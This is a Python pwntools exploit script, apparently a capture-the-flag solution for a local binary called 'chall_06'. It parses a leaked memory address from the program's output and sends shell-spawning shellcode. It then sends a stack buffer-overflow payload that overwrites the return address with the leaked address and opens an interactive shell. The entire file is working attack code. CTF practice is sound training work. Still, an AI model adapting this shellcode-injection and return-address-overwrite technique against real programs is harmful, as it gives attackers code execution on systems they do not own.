from pwn import *
import re

context.arch = "amd64"
binary = context.binary = ELF('./chall_06')
p = process(binary.path)
resp = p.recv()
print(resp.decode())

leak_match = re.findall(b"(0x[0-9a-f]{6,16})", resp)
if not leak_match:
    log.error("No memory address leak found in the binary's output.")
    exit(1)
try:
    addr = int(leak_match[0], 16)
    log.info(f"Leaked address: {hex(addr)}")
except ValueError:
    log.error("Failed to convert leaked address to an integer.")
    exit(1)

try:
    shellcode_payload = asm(shellcraft.sh())
    log.info(f"Shellcode payload length: {len(shellcode_payload)} bytes")
except Exception as e:
    log.error(f"Error creating shellcode payload: {e}")
    exit(1)

try:
    p.sendline(shellcode_payload)
    log.info("Shellcode payload sent successfully.")
except Exception as e:
    log.error(f"Error sending shellcode payload: {e}")
    exit(1)

buffer_offset = 0x68
return_address_offset = 0x10
buffer_size = buffer_offset - return_address_offset

try:
    overflow_payload = b'A' * buffer_size  # Buffer overflow padding
    overflow_payload += p64(addr)  # Overwrite return address with the leaked address
    log.info(f"Overflow payload length: {len(overflow_payload)} bytes")
except Exception as e:
    log.error(f"Error creating overflow payload: {e}")
    exit(1)

try:
    p.sendline(overflow_payload)
    log.info("Overflow payload sent successfully.")
except Exception as e:
    log.error(f"Error sending overflow payload: {e}")
    exit(1)

try:
    p.interactive()
except Exception as e:
    log.error(f"Error interacting with the process: {e}")
    exit(1)
